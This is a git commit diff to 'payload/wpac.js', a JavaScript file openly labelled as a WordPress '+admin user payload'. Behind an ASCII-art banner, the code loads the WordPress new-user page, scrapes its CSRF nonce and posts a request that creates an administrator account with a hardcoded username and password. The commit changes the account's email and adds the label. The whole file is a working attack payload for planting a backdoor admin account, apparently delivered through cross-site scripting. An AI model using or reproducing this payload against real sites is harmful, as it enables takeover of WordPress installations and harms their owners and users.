ca49d31c05fec22bf585f33871dea57839bded43
m0ze <80548182+m0ze@users.noreply.github.com>
2021-03-18 09:43:37 +0300

    Update wpac.js

--- payload/wpac.js
+++ payload/wpac.js
@@ -1,3 +1,6 @@
+/*!
+- [ WordPress ] +admin user payload
+*/
 console.log(`%c
  ╔═══════════════════════════════════════════════════════════════════════════╗ 
  ║                                                                           ║ 
@@ -8,5 +11,4 @@ console.log(`%c
  ║    ██║ ╚═╝ ██║╚██████╔╝███████╗███████╗                                   ║ 
  ║    ╚═╝     ╚═╝ ╚═════╝ ╚══════╝╚══════╝    > No problem, right?           ║ 
  ║                                                                           ║ 
- ╚═══════════════════════════════════════════════════════════════════════════╝ `,"color:#e61d4c; background:#000000; font-family: monospace");u="/wp-admin/user-new.php";jQuery.get(u,function(e){jQuery.post(u,{action:"createuser","_wpnonce_create-user":e.match(/_wpnonce_create-user\"\svalue=\"(.+?)\"/)[1],user_login:"m0ze",email:"m0ze@wordpress.tld",pass1:"w3lc0m3m0ze",pass2:"w3lc0m3m0ze",role:"administrator"})});console.log("Welcome, m0ze!");
- 
+ ╚═══════════════════════════════════════════════════════════════════════════╝ `,"color:#e61d4c; background:#000000; font-family: monospace");u="/wp-admin/user-new.php";jQuery.get(u,function(e){jQuery.post(u,{action:"createuser","_wpnonce_create-user":e.match(/_wpnonce_create-user\"\svalue=\"(.+?)\"/)[1],user_login:"m0ze",email:"m0ze@tutanota.com",pass1:"w3lc0m3m0ze",pass2:"w3lc0m3m0ze",role:"administrator"})});console.log("Welcome, m0ze!");
